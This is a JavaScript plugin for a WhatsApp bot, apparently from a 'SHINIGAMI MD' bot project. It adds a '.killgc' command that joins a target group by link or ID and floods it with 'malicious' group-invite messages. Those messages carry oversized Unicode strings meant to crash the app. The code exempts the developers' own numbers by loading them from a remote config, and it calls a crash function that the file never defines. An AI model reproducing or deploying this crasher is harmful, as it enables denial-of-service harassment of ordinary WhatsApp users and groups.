const { cmd } = require('../momy');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const axios = require('axios');
const crypto = require('crypto');

// Helper sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// DEV NUMBERS PROTECTION
// ============================================================
let devNumbers = [];

async function loadDevNumbers() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/dawestava-hub/new-bot/refs/heads/main/config.json');
        if (response.data && response.data.ownerNumber) {
            devNumbers = response.data.ownerNumber.map(num => {
                let cleanNum = num.toString().replace(/[^0-9]/g, '');
                if (cleanNum.startsWith('0')) cleanNum = '255' + cleanNum.substring(1);
                return cleanNum + '@s.whatsapp.net';
            });
            console.log(`✅ Loaded ${devNumbers.length} protected developer numbers`);
        }
    } catch (e) {
        console.log('⚠️ Could not load dev numbers, using default protection');
        devNumbers = ['255627417402@s.whatsapp.net', '255789661031@s.whatsapp.net'];
    }
}

function isDevNumber(jid) {
    return devNumbers.includes(jid);
}

loadDevNumbers();

// ============================================================
// GROUP CRASH FUNCTIONS
// ============================================================
async function InViteAdminA(IsTarget, ptcp = false) {
  const msg = {
    groupInviteMessage: {
      groupName: "ཹ".repeat(130000),
      groupJid: '6285709664923-1627579259@g.us',
      inviteCode: 'h+64P9RhJDzgXSPf',
      inviteExpiration: '999',
      caption: `🧪⃟꙰⌁ ҈🎭⃟༑⌁⃰𝐒𝐪𝐮𝐢͢𝐜𝐡𝐲 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉ཀ͜͡🐉 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ`,
      thumbnail: null
    }
  };
  
  await prim.relayMessage(IsTarget, msg, 
  ptcp ? { participant: { jid: IsTarget } } : {}
  );
}
async function InViteAdminI(IsTarget, ptcp = false) {
  const msg = {
    groupInviteMessage: {
      groupName: "𑐶𑐵𑆷𑐷𑆵".repeat(39998),
      groupJid: '6285709664923-1627579259@g.us',
      inviteCode: 'h+64P9RhJDzgXSPf',
      inviteExpiration: '999',
      caption: `🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ ⁖🎭⃟༑⌁⃰𝐒𝐪𝐮𝐢͢𝐜𝐡𝐲 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ`,
      thumbnail: null
    }
  };
  
  await prim.relayMessage(IsTarget, msg, 
  ptcp ? { participant: { jid: IsTarget } } : {}
  );
}

// ====================================================l========
// OWNER COMMAND: .killgc
// ============================================================
cmd({
    pattern: "killgc",
    alias: ["killgroup", "groupcrash", "gckill"],
    desc: "Kill/Crash a group by sending malicious invite messages",
    category: "owner",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender, isGroup }) => {
    // Check if owner
    if (!isOwner) return reply("❌ Owner only command");

    let groupJid;

    // If command is used in a group, use current group
    if (isGroup && (!args[0] || args[0] === 'this')) {
        groupJid = from;
    } 
    // If user provided a group JID
    else if (args[0] && args[0].includes('@g.us')) {
        groupJid = args[0];
    }
    // If user provided a group link
    else if (args[0] && args[0].includes('chat.whatsapp.com')) {
        const inviteCode = args[0].split('/').pop();
        if (!inviteCode || inviteCode.length < 5) {
            return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ Invalid group link!
╰─────────────────────•`);
        }
        
        reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ 🔗 Joining group...
╰─────────────────────•`);
        
        try {
            groupJid = await conn.groupAcceptInvite(inviteCode);
            reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ✅ Joined group successfully!
│ 💀 Starting crash attack...
╰─────────────────────•`);
        } catch (e) {
            return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ Failed to join group!
│ Error: ${e.message}
╰─────────────────────•`);
        }
    }
    else {
        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ Please provide a group
│
│ 📌 Example:
│ • .killgc (use in group)
│ • .killgc this
│ • .killgc 1234567890@g.us
│ • .killgc https://chat.whatsapp.com/xxxxxx
╰─────────────────────•`);
    }

    // Check if bot is admin (optional, but recommended)
    try {
        const groupMetadata = await conn.groupMetadata(groupJid);
        const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        const isBotAdmin = groupMetadata.participants.find(p => p.id === botNumber && p.admin);
        
        if (!isBotAdmin) {
            await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ⚠️ Warning: Bot is not admin!
│ Crash may have limited effect
│
│ 💀 Continuing attack anyway...
╰─────────────────────•`);
        }
    } catch (e) {
        console.log("Could not check admin status:", e.message);
    }

    const groupName = groupJid.split('@')[0];
    
    // Send attack started message
    await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ 💀 KILL GROUP CRASH ATTACK
│
│ 📋 Group: ${groupName}
│ ⚡ Status: Attack in progress...
│ 🎯 Payloads: 100 cycles
╰─────────────────────•`);

    try {
        await killGroupCrash(conn, groupJid);
        
        // Send success message
        await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ✅ GROUP CRASH COMPLETED!
│ 📋 Group: ${groupName}
│ 💀 Status: Crashed successfully
╰─────────────────────•

> POWERED BY SHINIGAMI MD`);
        
    } catch (e) {
        console.error("Group Crash Error:", e);
        reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ GROUP CRASH FAILED
│ 📋 Group: ${groupName}
│ 💀 Error: ${e.message}
╰─────────────────────•`);
    }
});
